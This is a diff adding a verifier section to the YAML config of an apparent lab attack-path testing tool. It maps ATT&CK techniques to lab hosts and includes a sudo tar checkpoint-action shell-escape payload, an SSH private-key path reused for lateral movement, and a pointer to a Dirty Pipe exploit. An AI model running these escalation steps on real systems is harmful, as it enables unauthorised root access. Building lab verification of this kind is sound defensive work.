@@ -255,3 +255,56 @@ remediation:
       Remove the /var/run/docker.sock bind mount and revoke docker group
       membership. Socket access is root-equivalent on the container host.
     cost: 3
+
+# ─────────────────────────────────────────────────────────────────────────────
+# 5. Execution verifier (A3) — adapter mappings and technique parameters.
+#
+#    The verifier reads this section to know HOW to execute each technique in
+#    the lab and how to recognise success. Each entry maps a technique to:
+#      adapter     — the Python module that triggers it
+#      check       — the signal type used to decide pass/fail
+#      hosts       — which lab hosts this technique is planted on
+#      start_user  — the unprivileged account the technique starts from
+#
+#    Technique-specific fields (sudo_target, key_path, etc.) are passed through
+#    to the adapter verbatim. The verifier refuses to run anything not listed.
+# ─────────────────────────────────────────────────────────────────────────────
+verifier:
+  canary_path: /root/.ascend_canary
+  reset_mode: recreate
+  compose_file: lab/docker-compose.yml
+  container_prefix: "ascend-"
+
+  techniques:
+    - id: T1548.003
+      adapter: config_abuse
+      check: sudo_rule
+      hosts: [app01]
+      start_user: appuser
+      sudo_target: "/bin/tar"
+      # tar --checkpoint-action=exec=<cmd> gives a shell escape (GTFOBins)
+      payload_template: "sudo -n /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat {canary}'"
+
+    - id: T1552.001
+      adapter: config_abuse
+      check: credential_read
+      hosts: [web01]
+      start_user: www-data
+      key_path: "/var/www/.ssh/id_rsa"
+
+    - id: "T1021.004+T1550"
+      adapter: lateral_ssh
+      check: canary_on_target
+      hosts: [web01]
+      start_user: www-data
+      key_path: "/var/www/.ssh/id_rsa"
+      to_host: app01
+      to_user: appuser
+
+    - id: T1068
+      adapter: anchor_cve
+      check: canary
+      hosts: [db01]
+      start_user: dbuser
+      exploit_ref: "/opt/exploits/CVE-2022-0847/exploit"
+
